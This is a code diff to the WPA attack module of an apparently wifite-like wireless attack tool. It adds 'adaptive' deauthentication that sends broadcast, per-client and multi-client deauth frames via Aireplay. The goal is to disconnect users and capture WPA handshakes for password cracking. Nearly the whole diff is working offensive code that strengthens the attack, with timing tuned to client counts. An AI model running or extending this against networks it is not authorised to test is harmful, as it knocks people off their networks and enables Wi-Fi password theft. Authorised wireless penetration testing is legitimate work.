@@ -163,26 +163,36 @@ class AttackWPA(Attack):
                         return handshake
 
                 timeout_timer = Timer(Configuration.wpa_attack_timeout)
-                deauth_timer = Timer(Configuration.wpa_deauth_timeout)
-
+                
+                # Adaptive deauth timing based on network activity
+                adaptive_deauth_timer = self.create_adaptive_deauth_timer()
+                
                 last_handshake_check = 0
                 last_client_check = 0
+                iteration_count = 0
+                max_iterations = Configuration.wpa_attack_timeout * 2  # Prevent infinite loops
                 
-                while handshake is None and not timeout_timer.ended():
+                Color.pl('{+} {C}Starting enhanced handshake capture with adaptive timing{W}')
+                
+                while handshake is None and not timeout_timer.ended() and iteration_count < max_iterations:
                     current_time = time.time()
-                    step_timer = Timer(1)  # Check every 1 second for better responsiveness
+                    iteration_count += 1
+                    
+                    # Adaptive timing based on network activity
+                    check_interval = self.get_adaptive_check_interval(len(self.clients), iteration_count)
+                    deauth_interval = self.get_adaptive_deauth_interval(len(self.clients), iteration_count)
                     
                     # Add more detailed progress information
                     elapsed_time = int(time.time() - timeout_timer.start_time)
-                    progress_msg = 'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W}, elapsed:{C}%ds{W})' % (
-                        len(self.clients), deauth_timer, timeout_timer, elapsed_time)
+                    progress_msg = 'Enhanced capture. (clients:{G}%d{W}, deauth:{O}%ds{W}, timeout:{R}%s{W}, elapsed:{C}%ds{W}, iter:{C}%d{W})' % (
+                        len(self.clients), deauth_interval, timeout_timer, elapsed_time, iteration_count)
                     Color.pattack('WPA',
                             airodump_target,
                             'Handshake capture',
                             progress_msg)
 
-                    # Check for handshake every 2 seconds (optimized)
-                    if current_time - last_handshake_check >= 2:
+                    # Adaptive handshake checking
+                    if current_time - last_handshake_check >= check_interval:
                         last_handshake_check = current_time
                         
                         # Find .cap file
@@ -196,7 +206,7 @@ class AttackWPA(Attack):
                                 copy(cap_file, temp_file)
                             except Exception as e:
                                 Color.pl('\n{!} {R}Failed to copy cap file: {O}%s{W}' % str(e))
-                                time.sleep(step_timer.remaining())
+                                time.sleep(0.5)
                                 continue
 
                             # Check cap file in temp for Handshake
@@ -229,7 +239,7 @@ class AttackWPA(Attack):
                             except Exception as e:
                                 Color.pl('\n{!} {O}Warning: Failed to remove temp file: {O}%s{W}' % str(e))
 
-                    # Look for new clients every 3 seconds (optimized)
+                    # Adaptive client discovery
                     if current_time - last_client_check >= 3:
                         last_client_check = current_time
                         try:
@@ -246,17 +256,18 @@ class AttackWPA(Attack):
                         except Exception as e:
                             Color.pl('\n{!} {R}Error updating clients: {O}%s{W}' % str(e))
 
-                    # Send deauth to a client or broadcast
-                    if deauth_timer.ended():
+                    # Adaptive deauthentication
+                    if adaptive_deauth_timer.ended():
                         try:
-                            self.deauth(airodump_target)
-                            # Restart timer
-                            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+                            self.adaptive_deauth(airodump_target, len(self.clients), iteration_count)
+                            # Restart timer with adaptive interval
+                            adaptive_deauth_timer = Timer(deauth_interval)
                         except Exception as e:
-                            Color.pl('\n{!} {R}Error during deauth: {O}%s{W}' % str(e))
+                            Color.pl('\n{!} {R}Error during adaptive deauth: {O}%s{W}' % str(e))
 
-                    # Sleep for 1 second (optimized)
-                    time.sleep(step_timer.remaining())
+                    # Adaptive sleep based on activity
+                    sleep_time = self.get_adaptive_sleep_time(len(self.clients), iteration_count)
+                    time.sleep(sleep_time)
                     continue # Handshake listen+deauth loop
 
         except KeyboardInterrupt:
@@ -377,8 +388,90 @@ class AttackWPA(Attack):
             raise
 
 
+    def create_adaptive_deauth_timer(self):
+        """Create adaptive deauth timer based on initial conditions"""
+        base_timeout = Configuration.wpa_deauth_timeout
+        return Timer(base_timeout)
+
+    def get_adaptive_check_interval(self, client_count, iteration):
+        """Get adaptive check interval based on client count and iteration"""
+        if client_count == 0:
+            return 3  # Slower checking when no clients
+        elif client_count >= 3:
+            return 1  # Faster checking with many clients
+        else:
+            return 2  # Normal checking with few clients
+
+    def get_adaptive_deauth_interval(self, client_count, iteration):
+        """Get adaptive deauth interval based on client count and iteration"""
+        base_interval = Configuration.wpa_deauth_timeout
+        
+        if client_count == 0:
+            return base_interval * 2  # Less frequent deauth when no clients
+        elif client_count >= 3:
+            return max(5, base_interval // 2)  # More frequent deauth with many clients
+        else:
+            return base_interval  # Normal interval
+
+    def get_adaptive_sleep_time(self, client_count, iteration):
+        """Get adaptive sleep time based on activity"""
+        if client_count == 0:
+            return 1.0  # Longer sleep when no activity
+        elif client_count >= 3:
+            return 0.5  # Shorter sleep with high activity
+        else:
+            return 0.8  # Normal sleep
+
+    def adaptive_deauth(self, target, client_count, iteration):
+        """Enhanced deauthentication with adaptive strategies"""
+        if Configuration.no_deauth: 
+            return
+
+        try:
+            # Determine deauth strategy based on client count and iteration
+            if client_count == 0:
+                # No clients - try broadcast deauth to trigger any hidden clients
+                Color.clear_entire_line()
+                Color.pattack('WPA', target, 'Handshake capture', 'Adaptive deauth: {O}Broadcast{W} (no clients)')
+                try:
+                    Aireplay.deauth(target.bssid, client_mac=None, timeout=2)
+                except Exception as e:
+                    Color.pl('\n{!} {R}Error deauthing broadcast: {O}%s{W}' % str(e))
+                    
+            elif client_count == 1:
+                # Single client - targeted deauth
+                client_mac = self.clients[0]
+                Color.clear_entire_line()
+                Color.pattack('WPA', target, 'Handshake capture', 'Adaptive deauth: {O}Targeted{W} client {G}%s{W}' % client_mac)
+                try:
+                    Aireplay.deauth(target.bssid, client_mac=client_mac, timeout=2)
+                except Exception as e:
+                    Color.pl('\n{!} {R}Error deauthing client: {O}%s{W}' % str(e))
+                    
+            else:
+                # Multiple clients - comprehensive deauth strategy
+                Color.clear_entire_line()
+                Color.pattack('WPA', target, 'Handshake capture', 'Adaptive deauth: {O}Multi-client{W} strategy')
+                
+                # First, deauth all clients individually
+                for client_mac in self.clients:
+                    try:
+                        Aireplay.deauth(target.bssid, client_mac=client_mac, timeout=1)
+                    except Exception as e:
+                        Color.pl('\n{!} {R}Error deauthing client %s: {O}%s{W}' % (client_mac, str(e)))
+                
+                # Then broadcast deauth for good measure
+                try:
+                    Aireplay.deauth(target.bssid, client_mac=None, timeout=1)
+                except Exception as e:
+                    Color.pl('\n{!} {R}Error deauthing broadcast: {O}%s{W}' % str(e))
+
+        except Exception as e:
+            Color.pl('\n{!} {R}Error during adaptive deauth: {O}%s{W}' % str(e))
+
     def deauth(self, target):
         '''
+            Legacy deauthentication method - kept for compatibility.
             Sends deauthentication request to broadcast and every client of target.
             Args:
                 target - The Target to deauth, including clients.
